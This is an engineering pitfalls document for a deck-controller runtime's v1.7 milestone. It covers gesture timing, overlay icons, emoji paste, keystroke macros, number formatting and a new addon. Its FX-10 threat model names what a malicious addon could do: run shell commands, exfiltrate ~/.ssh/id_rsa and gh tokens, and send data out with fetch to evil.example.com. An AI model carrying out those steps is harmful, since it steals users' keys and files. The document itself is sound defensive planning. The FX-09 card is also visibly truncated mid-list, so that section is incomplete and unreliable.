# Pitfalls — v1.7 (UX Friction, 3rd-Party Test, Builtin Expansion)

**Milestone:** v1.7 — UX Friction Round 2 + 3rd-Party Addon/Theme Smoke Test + ValueDisplay Builtin
**Researched:** 2026-06-17
**Confidence:** HIGH on prior regressions (Phases 42/55/56/58/59/66/67/68), MEDIUM on cross-platform keystroke gotchas (no fresh macOS/Windows UAT was run for this research), MEDIUM on the 3rd-party trust boundary (no real malicious addon was attempted; the threat model is reasoned from `addon/loader.ts`)

This milestone mixes three flavors of work: seven narrowly-scoped bug fixes (FX-01..FX-07), one polish item (FX-08), one new builtin addon (FX-09), and the first real 3rd-party code the runtime will execute (FX-10, FX-11). The pitfalls below are organized by item, with explicit cross-cutting risks called out at the end. A "Top 5 Risks" summary and a list of Open Questions close the doc.

## How to read this document

Each FX card follows the same shape:

- **Item:** the verbatim user-reported bug or feature name.
- **Risk:** what could go wrong, in 1-2 sentences.
- **Likelihood × Impact:** 1-5 each, with a one-line justification.
- **Why this is a new bug** (where applicable): a short note distinguishing the v1.7 finding from a v1.6 leftover. Many of these are "the v1.6 fix stopped one step short"; the note makes the gap explicit.
- **Mitigation:** the concrete safeguard the plan-phase must include. A test, a code-review check, a design constraint, an emulator or hardware verification step.
- **Linked regression:** the past regression in STATE.md or `.planning/solutions/` that has the same shape.

After the FX cards, the **Cross-Cutting Risks** section calls out the 5 risks that span multiple FX items. These are the "if you fix one and break the other" traps. The **Warning Signs** table is the red-flag list for execution. The **Prevention Strategies** table is the one-glance "if you do X, you avoid Y" list. The **Top 5 Risks** is the priority-ranked summary. The **Open Questions** are the items the user must answer before `discuss-phase`. The **What plan-phase must include** is the concrete acceptance checklist — the *minimum* evidence each FX item must produce before it is "executed."

## FX-01 — System back-button still has delay (settings page regression)

- **Item:** System back buttons still having delay, for example the settings page.
- **Risk:** Phase 58 brought back-button transitions to in-process 12.35ms. If the settings deck (which uses internal-settings buttons) now feels slow, either the skip-when-unchanged capture path is being defeated by the internal-settings render (e.g. `current_brightness` updates every second and the HTML changes on every poll), or a new await chain has been added between press and render. The most likely culprit is the `current_brightness` `defaultRenderIntervalMs: 1000` (see `internal-settings/buttons/current-brightness.tsx:6`) which intentionally re-renders every second — that HTML *is* changing, so the screenshot is correctly *not* skipped, but the on-device transition still has to pay the full Playwright IPC + USB hop.
- **Likelihood × Impact:** 3 × 4. Likely (Phase 58's "skip-when-unchanged" was measured in-process; no Phase 58 verification ever ran on real hardware with a `current_brightness` tile). High impact (the entire settings flow feels slow, which is the most-visited deck on the device).
- **Mitigation:** (a) The plan must include a `SIRENO_PROFILE=1` profile run on real hardware that times a "settings → main" back tap and reports the per-hop JSON, not just an in-process number. (b) The fix should consider whether `current_brightness` can coarser-grain (e.g. 2s interval) or whether the back button is a separate render path that doesn't wait for the deck surface to settle. (c) Add a regression test in `runtime.test.ts` that asserts the back button does not block on the brightness poll — i.e. the back transition completes in < 50ms *after* the press handler fires, not after the brightness poll completes. (d) Do not regress Phase 58: any "fix" must keep the per-deck cached HTML hash in `browser-renderer.ts` intact, and the steady-state live-hardware mode (capture reason = "live") must still always fire.
- **Why this is a *new* bug, not a v1.6 leftover:** the v1.6 back-button fix targeted the *base* deck back tap. The settings deck is reached via the SplitActionSurface dispatcher at `system-buttons.ts:43-52` which uses `role: 'settings'`, a separate code path from `role: 'back'`. The settings page is rendered by `internal-settings/buttons/current-brightness.tsx` which has its own `defaultRenderIntervalMs: 1000` that defeats the per-deck HTML cache. A "fix" that assumes all slow back transitions are base-deck transitions will miss this.
- **Linked regression:** Phase 56 (gesture-state spread solution at `.planning/solutions/best-practices/gesture-state-spread-not-replace-2026-06-10.md`) — the gesture state must still spread `{...gs, holdTimer, holdTriggered}` after any fix. Phase 58 PERF-01 (12.35ms in-process) and Phase 67 (`createInternalSettingsDeck` fixed positions; the 67-02 gap-closure was about *position collision*, not timing, so this is a fresh regression to investigate). Phase 70 (verification + metadata backfill) — the 12.35ms in-process number was documented with a hardware caveat; the user is now reporting that caveat is real.

## FX-02 — Double-tap on no-callback button still fires tap

- **Item:** When double-tap a button that has no `dbltap` callback, the normal tap callback fires — it should do nothing.
- **Risk:** In `runtime.ts:1739-1757`, `onKeyEvent` reads `instance.onDblTap`. If it exists, it schedules the 400ms double-tap timer; if it does NOT exist, it calls `handleTap(event.keyIndex)` directly on every release. The result: a user who double-taps a tap-only button gets **two** tap callbacks fired (one for each release) within the double-tap window. The user-reported expectation is that the second tap should be silently swallowed so the action runs once. The hidden subtlety is that the *first* tap is already fired inside `onKeyEvent` (the release path always runs `handleTap` on the trailing edge of a press when there is no dblTap). So a single tap works fine, but a double tap fires `handleTap` twice.
- **Likelihood × Impact:** 4 × 3. Highly likely — every builtin action button that does not declare `onDblTap` is affected. Medium impact: the action runs twice (e.g. Chrome opens two tabs, brightness jumps two notches, "Unclose tab" opens two). Annoying but not data-loss.
- **Why this is a *new* bug, not a v1.6 leftover:** v1.6 shipped the `pendingDblTapTimer` mechanism (Phase 56) for the case "tap-then-tap-within-400ms-when-onDblTap-exists". The fix correctly *defers* the first tap and fires the dblTap handler on the second tap. But the *no-onDblTap* branch was never updated; the existing code just fires `handleTap` on every release. The user is reporting the asymmetry: with `onDblTap`, double-tap fires dblTap once; without `onDblTap`, double-tap fires tap twice. The fix is to introduce a symmetric "single-tap debounce" for the no-onDblTap branch.
- **Mitigation:** (a) The plan must introduce a *single-tap debounce window* on the release path: if a tap was fired within the last `DOUBLE_TAP_DELAY_MS` (400ms) and `onDblTap` is absent, suppress the second tap. The simplest implementation: a `Map<stateKey, lastTapAt>` alongside `gestureStates`, set on every `handleTap` call, and the release-time branch checks "is this tap within 400ms of a prior tap?" and if so, ignores it. (b) Add a focused test in `runtime.test.ts`: declare a button with only `onTap`, fire two press/release pairs within 400ms, assert `onTap` was called **exactly once** (or with a `count === 1` expectation). (c) Cross-check the existing `double-tap back dismisses overlay` test (line 4657) still passes — the fix must not regress the dblTap path when `onDblTap` IS defined. (d) The fix must be a per-button debounce, not a global one — the user can simultaneously press button 3 and button 7, and a global debounce would swallow button 3's second tap when button 7's first tap fires.
- **Linked regression:** Phase 56 (gesture-state spread) — the fix will need a new field in `ButtonGestureState` (e.g. `lastTapAt?: number`), and the spread pattern must be used for every state update. The "set-vs-replace" trap is the same shape: if you `gestureStates.set(key, { lastTapAt: now })` without spreading, you'll drop `holdTimer` and `pendingDblTapTimer` from concurrent paths. Phase 67 (`createInternalSettingsDeck`) — the internal-settings buttons are exactly the kind of tap-only buttons that hit this bug; verify the fix against the real `brightness-up` / `brightness-down` test in `internal-settings/buttons/brightness-up.test.tsx`. Phase 68 (chrome overlay, every button is a tap-only `key_macro` action) — the chrome deck is the most-visible place this bug manifests.

## FX-03 — System buttons slot is not using SplitActionSurface in overlay context

- **Item:** When an overlay deck is available, the system buttons slot (Settings, Back) are not using the SplitActionSurface component to show the back-to-overlay.
- **Risk:** `system-buttons.ts:34-41` (and the tests in `system-buttons-dispatcher.test.ts:111-118`) show that when an overlay deck is active, the runtime injects `OVERLAY_TOGGLE_TYPE` at the last position — a separate, single-surface button — *not* a `SplitActionSurface`. The result: when an overlay is open, the user gets a plain overlay-toggle button (with no "back" affordance on the same key), and the pending-overlay / autoShow summon path is unreachable from the overlay itself. Phase 66 (SplitActionSurface) shipped the right primitive, but the dispatcher in `getLastPositionSystemButton` was never extended to use it in the overlay-active case.
- **Likelihood × Impact:** 4 × 4. Highly likely (the dispatcher is a single-file decision; reading the current code confirms the gap). High impact: a user with `autoShow: true` (e.g. the chrome overlay) cannot reach the base deck's "back" while the overlay is showing, and a user with `autoShow: false` cannot summon the overlay from the overlay's own reserved slot. The autoShow toggle was Phase 62's headline feature.
- **Mitigation:** (a) The plan must extend `getLastPositionSystemButton` to add a third branch: when `ctx.overlayDeckId !== null` AND a base-deck "back" would be valid AND a summonable autoShow-false deck exists, inject a `SPLIT_ACTION_TYPE` whose `primary` is overlay-toggle and whose `secondary` is the summon affordance (or vice versa). (b) Preserve the *test contract* from `system-buttons-dispatcher.test.ts:111` and `134-149` — if the user is *inside* the overlay, the toggle affordance is still reachable, and pagination overlay pages (`overlay-target-p1`, `overlay-target-p2`) still get a single-action overlay toggle. (c) Add a focused test: with `overlayDeckId: 'chrome'`, the last position button on the chrome deck is still `OVERLAY_TOGGLE_TYPE` (because you are ON the overlay, not on a base deck with a pending overlay). (d) The fix must NOT hard-code "chrome" — it must look up the overlay's `icon` from `ctx.runtimeDecks[overlayDeckId].icon` (see FX-04 for the related concern).
- **Linked regression:** Phase 66 (SplitActionSurface shipped, but the overlay-active branch was not extended). Phase 42 (system-reserved back button, where the rule "main deck has no back, sub-decks get system-back at n-1" was established — the new fix must honor that for the base deck even when an overlay is *pending*). Phase 55 (active-app overlay decks, the first wiring of `process_names` + `autoShow`). The `.planning/solutions/workflow-issues/user-redesign-mid-uat-invalidate-context-2026-06-15.md` pattern applies if mid-UAT the user rejects the chosen primary/secondary ordering — capture both orderings in the test before merging.

## FX-04 — Overlay deck icon not used in Toggle button and SplitActionSurface buttons

- **Item:** Despite an overlay deck has an icon, it is not used in the Toggle button and on the SplitActionSurface buttons.
- **Risk:** `OverlayToggleButton.tsx:24-27` currently derives the badge from `extractFirstEmoji(deckName)` — it parses an emoji out of the deck's `name` field, falling back to `id`, and falls back to a generic `layout-grid` lucide icon. It does *not* read `activeOverlayDeck.icon`, even though the loader test at `loader.test.ts:1356-1359` asserts `icon: /works/opensource/sireno-deck/assets/chrome.svg` is present in the chrome deck. The `SplitActionSurface` path in `runtime.ts:1097-1103` uses `MainLabelSurface` with the `send-to-back` icon for the secondary action and does not inject the overlay deck's icon either. So the user sees a generic layout-grid badge and a generic `send-to-back` icon, when the deck actually has a real chrome.svg / spotify.svg / etc. asset.
- **Likelihood × Impact:** 4 × 3. Highly likely (the asset path is already loaded by the addon registry, the runtime just doesn't read it). Medium impact: the visual affordance is generic instead of branded, which is the entire point of the `icon:` field on overlay decks (Phase 68 shipped it but the runtime never wired it).
- **Mitigation:** (a) The plan must extend `SystemButtonContext` (in `system-buttons.ts:11-20`) to include the runtime's `addonRegistry` (or a typed `resolveAssetPath` callback), so the dispatcher can resolve `overlayDeck.icon` (an `icon://`, `addon://`, or absolute path) into the same path the icon surfaces use. (b) `OverlayToggleButton.tsx` must accept the resolved icon path as a prop (not the deck name) and render the actual SVG via `<Icon src={...} />` (the existing path in `renderMetricIcon` in `system-status/buttons/label-values.tsx:45-57` is the right pattern). (c) The fix must NOT remove the `extractFirstEmoji(deckName)` fallback — the chrome deck has `name: undefined` in the test fixture, so the badge must still work when the name is absent and the icon is absent. (d) Add a regression test in `OverlayToggleButton.test.tsx` that mounts with a deck where `icon: '/path/to/chrome.svg'` and asserts the HTML contains a `<Icon src="/path/to/chrome.svg" />` element (or a stable data attribute).
- **Linked regression:** Phase 68 (chrome deck icon path typo + missing asset at `.planning/solutions/ui-bugs/chrome-deck-icon-path-typo-missing-asset-2026-06-15.md`) — the loader test asserts the icon path but the runtime never *consumes* it. The same shape of bug ("config test passes, runtime ignores the field") is exactly what the solution file warns about.

## FX-05 — Emoji paste does not work (pasteText only writes to clipboard)

- **Item:** Emoji copy works, but paste does not. (The v1.6 ROADMAP claimed this was fixed in Phase 59 — EMO-15 was marked satisfied, but the actual code in `util/clipboard.ts:3-5` and `runtime.ts:1005-1008` shows `pasteText` only does `clipboardy.write(text)` and never simulates the platform paste key.)
- **Risk:** `methods.pasteText` is a pure clipboard write. The emoji selector entry button (`emoji-selector/buttons/entry.tsx:25, 29`) calls `methods.pasteText(config.emoji)` and expects the emoji to appear in the focused input. On Linux/macOS/Windows, the OS will only insert the clipboard contents if the *active app* receives a `Ctrl+V` / `Cmd+V` keystroke. The keyMacro provider (`system/key-macro/`) already has the right per-platform backends (xdotool, osascript, SendKeys), and `parseKeyMacro('ctrl+v')` and `parseKeyMacro('cmd+v')` both produce the right step arrays — but `pasteText` never composes the step.
- **Likelihood × Impact:** 5 × 4. Certain (the code does not call the macro provider). High impact: the headline feature of the emoji selector (Phase 49) does not work end-to-end on the only platform that was tested during v1.6 verification.
- **Why this is a *new* bug, not a v1.6 leftover:** v1.6's Phase 59 introduced `methods.pasteText` at `runtime.ts:1005-1008` and `util/clipboard.ts:3-5`. The intent was clearly "clipboard write + paste keystroke" (the v1.6 ROADMAP at line 44 says "Tapping an emoji in the emoji selector writes the emoji character to the system clipboard AND simulates the OS paste keystroke"). But the implementation stopped at the clipboard write. The Phase 59 verification tests at `util/clipboard.test.ts` mock the clipboard and assert the write happens — they never assert the keystroke fires, because the keystroke is *never called* in the current code. The "mock the side effect, never exercise the real path" trap is the same shape as `.planning/solutions/workflow-issues/new-tests-pass-in-isolation-fail-in-full-file-2026-06-04.md`.
- **Mitigation:** (a) The plan must extend `methods.pasteText(text)` to (1) `clipboardy.write(text)` and then (2) `keyMacroProvider.send(parseKeyMacro(platformPasteKey))` where `platformPasteKey` is `'ctrl+v'` on Linux/Windows and `'cmd+v'` on macOS. The keyMacro provider is already in the runtime options (`runtime.ts:409-411`), so the wiring is local. (b) The plan must also add a `wait 50ms` step between the write and the paste — on Linux, xdotool races against the clipboard sync daemon; on macOS, `osascript` may be slow to start. The `parseKeyMacro('wait 50ms, ctrl+v')` step chain is the right shape. (c) Update `pasteText` tests in `util/clipboard.test.ts` to mock `keyMacroProvider.send` and assert the call order (write first, paste second). (d) Mark EMO-15 in the next `REQUIREMENTS.md` as "partially satisfied" in the v1.6 retrospective and re-verify in v1.7. (e) Add a real-keyMacro test that uses a recording executor and asserts the `KeyMacroStep[]` shape sent to the platform — covers the case where a future refactor accidentally drops the paste step.
- **Linked regression:** Phase 59 (`pasteText` extension was attempted but stopped at the `clipboardy.write` half). The Phase 59-VERIFICATION test count (12 tests) passed because they all mocked `keyMacroProvider` and never asserted the *order*. The "tests pass in isolation, missing real-path" trap is the same shape as `.planning/solutions/workflow-issues/new-tests-pass-in-isolation-fail-in-full-file-2026-06-04.md`. The threat is that the fix repeats the same gap: tests cover the mock, the real path remains broken.

## FX-06 — Macro keystrokes are not sent to apps

- **Item:** Macro keystrokes are not sent to apps.
- **Risk:** Three sub-bugs can hide under this single user report: (a) `keyMacroProvider.send` is silently swallowed if `execa` is called on a system where the binary is missing (Linux: `xdotool` not installed; macOS: `osascript` blocked by Accessibility; Windows: `powershell` blocked by ExecutionPolicy or by a non-admin user). The current code in `linux.ts:88-92` catches the failure and logs nothing visible. (b) The `index.ts:55-58` "pure Wayland" check returns an *unsupported* provider that *silently does nothing* (per `unsupported.ts`) — on a GNOME Wayland session with no XWayland bridge, the chrome overlay's "Ctrl+T" key macro is a no-op and the user sees nothing happen. (c) `keyMacroProvider` is constructed once in `runtime.ts:409-411` with `logger: { warn: () => {} }` — the default logger is a no-op. So even when a macro fails, nothing is surfaced.
- **Likelihood × Impact:** 4 × 4. Highly likely on Wayland and on locked-down macOS/Windows (a substantial fraction of users). High impact: the chrome overlay (Phase 68) is the primary v1.6 deliverable; if its actions silently fail, the entire feature is dead weight.
- **Mitigation:** (a) The plan must (1) replace the default `logger: { warn: () => {} }` with a real `pino` logger that surfaces keyMacro failures to the user (a one-time warning per session, not per call), and (2) the chrome overlay (and every key_macro user) gets a visible "permission denied" or "missing dependency" hint the *first* time a macro fails. (b) For Wayland: the keyMacro path must call out the limitation explicitly (the existing "pure-wayland" string in the unsupported provider name is the right hook) — surface a one-time startup warning if the user has any addon that uses `key_macro` and they are on pure Wayland. (c) For macOS: detect Accessibility permission status at startup (the `osascript` "not authorized" error is the signal) and surface a setup hint. (d) Add a focused test in `key-macro/get-provider.test.ts` that asserts the chrome deck loader test path produces a non-empty `pasteText` for the key_macro buttons (regression against FX-05).
- **Linked regression:** Phase 59 (pasteText extension — the keyMacro provider was added but its failure mode was hidden behind a no-op logger). Phase 49 (emoji-selector — the original `pasteText` came from a `clipboardy.write` plus a manual "press the paste key" reminder that was never enforced). The "missing dependency" pattern repeats from `.planning/solutions/best-practices/bespoke-live-visuals-can-stay-inside-the-deck-button-variant-seam-2026-05-15.md` (analog-clock seam) — same shape: a 1st-party addon's external tool is missing on the user's box.

## FX-07 — Bars component value needs a number formatter; default should be no decimals

- **Item:** Bars component value in the bar needs a number formatter, and by default should use no decimals.
- **Risk:** `BarsSurface.tsx:61` currently does `const valueText = item.displayValue ?? String(Math.round(item.value))` — it only renders the displayValue if the caller provided one. The bundled `system-status-bars` button (`builtin-addons/system-status/buttons/bars.tsx:111`) does provide `displayValue: displayMetric.formattedValue`, which comes from `numbro(metric.value).format(...)` in `display-metrics.ts:55-78`. The numbro default uses `mantissa: 1` for `bytes` / `count` (so "1.5 GB" instead of "2 GB") and `mantissa: 0` for `percent` and `mantissa: 2` for `frequency-ghz`. The user-reported expectation is that the *default* (no override) be no decimals — i.e. "75" not "75.0", "2 GB" not "2.0 GB". The current code's `Math.round` fallback is fine; the gap is in `display-metrics.ts:55-78` where the bundled formatter's mantissa is opinionated.
- **Likelihood × Impact:** 3 × 2. Medium likelihood (the bundled formatter is opinionated; 3rd-party addons calling `Bars` directly will hit the same shape). Low-medium impact: visual noise on the bar, not a functional break.
- **Mitigation:** (a) The plan must (1) change `display-metrics.ts` defaults to `mantissa: 0` for `bytes`, `count`, and `frequency-ghz` (the user wants no decimals), and (2) allow per-metric override via the `formatter` override field (already in the schema at `schemas.ts:15-23`). (b) Add a `formatBarsValue(value, formatter?: SystemStatusFormatter)` helper to `BarsSurface` so external callers (`<Bars>` from a 3rd-party addon) get the same default behavior without re-implementing numbro calls. (c) Add a focused test in `Bars.test.tsx` that asserts `items[0].value === 75.4` renders as `"75"` by default, and as `"75.4"` when `themePrimaryHex` + `useSharpPath` use a different formatter. (d) Document the formatter contract in `BarsSurface`'s JSDoc.
- **Linked regression:** Phase 30 (Bars + LabelValueList helper surface) — the bundled system-status addon already has the formatter but it leaks opinions through to the bar. The `numbro` chain in `display-metrics.ts` is the right place to change, but the `Math.round` fallback in `BarsSurface` is the right place to add a `formatBarsValue` helper that 3rd parties can call without going through system-status.

## FX-08 — system-status-label-values for 2 and 3 items needs a better layout

- **Item:** system-status-label-values for 2 and 3 items needs a better layout.
- **Risk:** `LabelValueListSurface.tsx:33-43` has three layouts: `single` (1 line, big value), `double` (2 lines, side-by-side, gap-3), and `stack` (3-4 lines, vertical, gap-2). The user report says 2 and 3 items specifically need work. For 2 items the `double` layout renders as `flex-col justify-center gap-3` with two rows, but each row is a horizontal flex of `[icon] label ... value units` — at 72px key width this can squish the value. For 3 items the `stack` layout is the same as 4 items (3-4 lines get the same `flex-col justify-center gap-2`), which leaves too much vertical air on a 72px key.
- **Likelihood × Impact:** 3 × 2. Medium likelihood (current code is functional; the complaint is about visual density). Low-medium impact: the system-status-label-values button is the most-clicked button on the device, and a cramped layout means mis-taps.
- **Mitigation:** (a) The plan must (1) split `stack` into `stack-3` (gap-1, smaller font) and `stack-4` (gap-2, current font), and (2) make `double` use a 2-column grid (not a flex column) so the value cell is genuinely right-aligned at 50% width. (b) Preserve the existing `data-sireno-label-value-layout` attribute — themes or downstream tests key off it. (c) Add focused tests in `LabelValueList.test.tsx` that mount 2-line and 3-line variants and assert the layout attribute and a stable data attribute on the value cell (e.g. `data-sireno-label-value-cell-position="0|1"`). (d) Verify the new layout against the existing `brightness.test.ts` font-size contract (no implicit role-class sizing per Phase 1 decision in STATE.md).
- **Linked regression:** Phase 30 (LabelValueList shipped with single/double/stack). Phase 1 (typography role-base + shared `Text` — any layout change must stay on the size ladder, not introduce ad-hoc `text-base` shortcuts). The "stay on the size ladder" rule from STATE.md Phase 1 is a hidden constraint here.

## FX-09 — New builtin addon `ValueDisplay`

- **Item:** New builtin addon `ValueDisplay`.
- **Risk:** A new addon with a fresh button type and (potentially) a fresh config schema is a vector for the same kind of gaps that v1.4 / v1.5 saw: (a) Zod shape-extension breakage if the new schema uses `.refine()` (per `.planning/solutions/best-practices/zod-refine-silently-breaks-shape-consumers-2026-06-09.md`); (b) addon API version drift if the new schema uses a feature added after `SIRENO_ADDON_API_VERSION = 1`; (c) manifest validation gap if the new addon has an `assets:` map and a relative-path typo; (d) wrong export shape if the addon is bundled through `addon/builtin.ts` but the export is `named` instead of `default`. (e) Missing `defaultPollIntervalMs` / `defaultRenderIntervalMs` if the addon's first version is "fire once on activation" — without an interval, the rendered value never updates.
- **Likelihood × Impact:** 3 × 3. Medium likelihood (the gaps are well-documented in the solutions store, so a careful author avoids them, but a hurried author hits all four). Medium impact: a broken builtin blocks `/ship` because builtins are loaded in every `loader.test.ts` and `builtin.test.ts` run.
- **Why this is a *new* feature, not a v1.6 leftover:** the existing builtins (`system-status-bars`, `system-status-label-values`, `weather`, `media-player`, `date-time`, `emoji-selector`, etc.) all poll an external data source or run a clock. (c) Add a focused `builtin-addons/value-display/index.test.ts` asserting (i) addon exports default, (ii) apiVersion is current, (iii) at least one button's render returns a ReactElement, (iv) the schema rejects an unknown key. (d) Decide the *narrow scope* before `discuss-phase`: what does the button display? A static string, a number, a date, an HTTP-polled value? Each shape has different test requirements. The v1.7 plan must narrow this — "ValueDisplay" is too vague.
- **Linked regression:** Phase 5 (addon system kickoff — the apiVersion contract was "versioned from day one" per STATE.md Blockers). Phase 30 (system-status + media-player builtin addons — same shape as the new ValueDisplay, except ValueDisplay likely needs no polling if its data is config-driven). ## FX-10 — 3rd-party addon at `/works/test/test-sireno-deck`

- **Item:** 3rd-party addon at `/works/test/test-sireno-deck` (note: as of 2026-06-17, this path does not yet exist on disk; the addon will be authored as part of the v1.7 work).
- **Risk:** This is the **first real 3rd-party code the runtime will execute** (per AGENTS.md "v1 model is trusted in-process"). The loader at `addon/loader.ts:60-75` resolves `source: 'local'` to an absolute path, and `loader.ts:95-104` imports the addon's `default` export via `tsx/esm/api` (a `tsx` TypeScript loader that compiles `.ts`/`.tsx` in-process). There is no sandbox, no permission prompt, no capability check. A malicious 3rd-party addon can: (a) `import { execa } from 'execa'` and run arbitrary shell commands (execa is a built-in transitive dep of the CLI itself, available in `node_modules`), (b) `import { readFileSync } from 'node:fs'` and exfiltrate `~/.ssh/id_rsa`, `~/.config/gh/hosts.yml`, or any process-readable file, (c) `import clipboardy from 'clipboardy'` and read the user's clipboard, (d) `fetch('https://evil.example.com', { body: ... })` and phone home. The trust boundary is "the user opted in by adding the addon to their `config.yml` and setting `enabled: true`." That is an *acceptable* trust model for a developer tool, but it must be **honest** — the README, the addon author guide, and any in-app warning must not pretend the runtime is sandboxed.
- **Likelihood × Impact:** 5 × 5. Certain (the loader is unsandboxed by design). Critical impact if a user installs a malicious addon thinking the runtime is sandboxed — RCE-level. Lower impact if the user understands the trust model (developer opts in by adding a path to config).
- **Why this is a *new* risk, not a v1.6 leftover:** the v1.6 chrome deck (`config.yml:79-120`) and the v1.6 local-raw-addon fixture (`packages/cli/fixtures/phase-23-local-raw-addon/`) already exercise the local-source loader path. But the v1.6 fixtures are *committed* (in the repo, reviewed by the maintainer). The v1.7 test addon at `/works/test/test-sireno-deck` will be the *first* 3rd-party code in the wild — outside the repo, not reviewed. The risk is that the v1.7 work accidentally normalizes "3rd-party addons are safe" without explicitly saying "they are not." The `addon/loader.ts` runtime behavior is the same; the *trust policy* is what changes.
- **Mitigation:** (a) The plan must (1) document the trust model in `packages/cli/README.md` with one explicit sentence: "Addons execute in-process with full Node.js permissions; only install addons you trust." (2) Keep the existing `assertRawSourceModuleGraph` check in `loader.ts:155-192` (it prevents addons from importing outside their root, which is a *correctness* check, not a *security* one, but it's the closest thing to a sandbox we have). (3) The test addon at `/works/test/test-sireno-deck` must (i) declare a non-zero `apiVersion` (1), (ii) export default with a `SirenoAddon` shape, (iii) include at least one button, and (iv) be loadable through `pnpm cli:dev start --config /path/to/test-config.yml`. (4) The plan must add an integration test in `addon/loader.test.ts` that points at the real path on disk and asserts successful load. (5) The plan must explicitly **not** introduce a `child_process.fork`-based sandbox — that would be a v2+ feature with its own API stability implications. (6) The test addon must be honest in its `package.json` description: "This is a first-party test fixture for v1.7's 3rd-party smoke test; not a user-facing addon." Anything else invites users to install it in their main config.
- **Linked regression:** Phase 23 (local raw-source addon loading via `tsx` — same in-process execution model). Phase 25 (theme runtime imports via the same `tsx` import seam — themes are also untrusted TS in the same trust model). The `loader.test.ts:130` "rejects apiVersion mismatches" pattern is the only runtime guard we have; the test must remain a load-bearing guard. The zod-refine solution at `.planning/solutions/best-practices/zod-refine-silently-breaks-shape-consumers-2026-06-09.md` applies to *any* addon that uses `.shape` extension — the v1.7 test addon is a real consumer of that contract.

## Cross-Cutting Risks

### CC-1 — Gesture timing regressions (FX-01 + FX-02)

Both FX-01 (back button delay on settings) and FX-02 (double-tap on no-callback button) touch the gesture state machine in `runtime.ts:1592-1758`. **Invariant:** the `ButtonGestureState` map (`holdTimer`, `holdTriggered`, `pendingDblTapTimer`, and the new `lastTapAt` from FX-02's fix) must always be updated via spread (`{...gs, ...newFields}`) per the Phase 56 solution. A fix to FX-01 that introduces an `await chain` in `handlePress` must not regress the `pendingDblTapTimer` set in `handleRelease` (the exact pattern that the gesture-state-spread solution was written for). A fix to FX-02 that adds `lastTapAt` must not regress the FX-01 timing. The two fixes must be reviewed together; the plan must include a *combined* regression test that fires (a) single-tap, (b) double-tap, (c) tap-during-hold, and (d) double-tap on a no-callback button, and asserts the right combination of `onTap` / `onDblTap` / `onHold` calls for each.

**Specific trap:** the current code in `runtime.ts:1755-1757` is:

```ts
} else {
  await handleTap(event.keyIndex)
}
```

This is the branch that fires when there is *no* `onDblTap` — every release becomes a tap. The fix cannot just "add a debounce" because the debounce must coexist with the `pendingDblTapTimer` set by the `if (instance.onDblTap)` branch above it. The correct shape is: if no `onDblTap`, set a "single-tap pending" timer of `DOUBLE_TAP_DELAY_MS`; on the next release within that window, swallow it. If `onDblTap` exists, the existing path runs unchanged. The `lastTapAt` field is a *per-button* addition to `ButtonGestureState`, not a global debounce, because the user can simultaneously press button 3 and button 7 (we do not want button 3's second tap to be swallowed by button 7's first tap).

### CC-2 — Overlay wiring fragility (FX-03 + FX-04)

Both FX-03 (no SplitActionSurface in overlay context) and FX-04 (icon not used) touch the overlay system across `system-buttons.ts`, `OverlayToggleButton.tsx`, and `runtime.ts:1033-1106`. **Invariant:** a "fix" that hard-codes a specific overlay deck (e.g. "if id === 'chrome'") breaks the abstraction. The fix must look up the deck from `ctx.runtimeDecks[ctx.overlayDeckId]` and read its `icon` field; the dispatcher must not know about specific deck names. If mid-UAT the user rejects the chosen primary/secondary ordering (as in Phase 67's 67-02 gap closure), the `.planning/solutions/workflow-issues/user-redesign-mid-uat-invalidate-context-2026-06-15.md` pattern applies — capture the *test* before the *code*, and invalidate CONTEXT decisions rather than rewriting them.

**Specific trap:** the `SystemButtonContext` interface in `system-buttons.ts:11-20` does not currently include the addon registry. To resolve `icon:` to an actual path (FX-04), the dispatcher needs either the registry or a typed `resolveAssetPath` callback. Adding the registry to the context means every test that constructs a `SystemButtonContext` (e.g. `system-buttons-dispatcher.test.ts:51-87`) must update its fake. The plan must either update all fakes or extract a narrower `resolveOverlayIcon(deckId): string | undefined` helper that the registry call is encapsulated in. The narrower helper is the surgical change.

### CC-3 — Cross-platform keystroke injection (FX-05 + FX-06)

Both FX-05 (emoji paste) and FX-06 (macros not sent) touch the `keyMacroProvider` path. **Gotchas by platform:**

- **Linux X11:** `xdotool key --clearmodifiers` works without root, but `xdotool` may not be installed. On Debian/Ubuntu, `apt install xdotool` requires root. On Fedora, the package is `xdotool`. Detection: `which xdotool` at startup.
- **Linux Wayland (pure):** No xdotool. `wtype` requires the user to be in the `input` group. The existing `index.ts:55-58` correctly returns an unsupported provider, but the failure is silent (see FX-06). GNOME Shell has no public DBus API for key injection; the only path is a GNOME extension (Phase 0.4 quick task 043 was a stub for this).
- **macOS:** `osascript` with `System Events` requires Accessibility permission for the calling app. The first call typically prompts the user; subsequent calls are silent. Failure mode: the script returns an error like "Application can't be opened" or "not authorized" — the current code in `darwin.ts:113-122` logs a warn but does not surface to the user.
- **Windows:** `powershell.exe` with `[System.Windows.Forms.SendKeys]` works without admin for foreground keystrokes. `SendKeys` is a legacy API and has known issues with elevated windows. UAC prompt windows may reject SendKeys from a non-elevated process.
- **Focus loss race:** After `clipboardy.write`, the focused window may briefly lose focus (especially on macOS). The 50ms `wait` between write and paste in the FX-05 mitigation is the standard fix.

**Specific trap:** the default logger in `runtime.ts:409-411` is `logger: { warn: () => {} }` — a no-op. Every keystroke failure across all three platforms is silently swallowed. The plan must wire a real `pino` logger into the keyMacro provider at construction time, AND surface a one-time warning to the user (not per-call, or the log file will be unreadable). The right pattern: track a `Set<string>` of "warned failures" in the keyMacro provider, log each unique failure once per session.

### CC-4 — 3rd-party loader trust boundary (FX-10 + FX-11)

The loader is unsandboxed by design. **Trust model in practice:** the user adds a path to `config.yml`, sets `enabled: true`, and the runtime imports the module. There is no capability check, no permission prompt, no opt-in dialog. The only existing guards are: (a) `validateAddonApiVersion` refuses addons with the wrong `apiVersion` (a *correctness* guard, not a *security* one); (b) `assertRawSourceModuleGraph` refuses to import outside the addon root (a *correctness* guard — it prevents typos and accidental leaks, not malicious intent); (c) `addon/system` field reserves system button types so a user addon cannot claim them. **What this means for v1.7:** the test addons at `/works/test/test-sireno-deck` and `/works/test/test-sireno-deck-theme` must be honest in their documentation that they are *first-party test fixtures*, not user-facing addons. The plan must NOT promote them to "official community addons" or "official community themes" without an explicit user-trust audit. The README must say, plainly: "Addons and themes execute in-process. Only install code you trust."

